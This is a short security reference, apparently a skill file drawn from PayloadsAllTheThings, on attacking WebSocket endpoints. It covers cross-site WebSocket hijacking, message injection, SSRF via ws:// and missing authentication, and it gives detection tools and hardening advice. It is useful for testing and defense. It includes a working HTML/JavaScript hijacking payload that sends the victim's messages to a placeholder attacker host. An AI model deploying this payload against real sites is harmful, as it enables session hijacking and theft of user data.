---
name: web-sockets
description: Attack WebSocket endpoints — CSWSH, origin trust, message injection, lack of authentication, smuggling and SSRF via ws:// schemes
domain: cybersecurity
subdomain: web-application-security
tags: [websocket, cswsh, origin-check, ws-injection]
version: "1.0"
license: MIT
source: PayloadsAllTheThings/Web Sockets
---

# WebSocket Security

## Overview
WebSocket upgrades from HTTP to a long-lived bidirectional connection. After the handshake, browser SOP does not apply to message contents. Servers that authenticate via cookies and don't verify `Origin` are vulnerable to Cross-Site WebSocket Hijacking (CSWSH).

## Cross-Site WebSocket Hijacking (CSWSH)
Victim visits attacker page → JS opens `new WebSocket('wss://target/socket')` → browser attaches victim's cookies → server accepts (no Origin check) → attacker reads/sends messages as victim.

```html
<script>
ws = new WebSocket('wss://target.com/chat');
ws.onmessage = e => fetch('//evil/?d=' + btoa(e.data));
ws.onopen = () => ws.send(JSON.stringify({action:'list_messages'}));
</script>
```

## Other Attacks
- **Authentication only at HTTP upgrade**: subsequent messages trusted; manipulate routing in JSON message to access other tenants.
- **Message injection / XSS**: server echoes user messages without escaping to other users.
- **CSRF inside WS**: same-origin page issues mutations via WS without CSRF token.
- **SSRF via ws://**: server-side fetcher accepts ws/wss schemes → can talk to internal ws services (chat backends, k8s API, etc.).
- **Request smuggling via WS upgrade headers**: malformed Upgrade headers desync proxies (CVE-2022-22965-adjacent classes).
- **No size limits**: client sends huge messages → DoS / memory exhaustion.
- **Lack of TLS**: ws:// over public WiFi → MITM.

## Detection
- Burp's WebSockets history; replay/repeat individual messages.
- **wssip** MITM proxy.
- Check `Sec-WebSocket-Origin` handling — replay without it, with attacker origin.

## Hardening
- Verify `Origin` header at handshake; reject unknown.
- Use unique per-connection auth token (not just session cookie).
- Authorize every message, not just the handshake.
- Apply CSRF-style anti-replay tokens for sensitive actions.
- Enforce message size limits + rate limits.
- wss:// only; reject ws:// in production.

## References
- `payloadsallthethings/Web Sockets/README.md`
- PortSwigger WebSockets Academy.
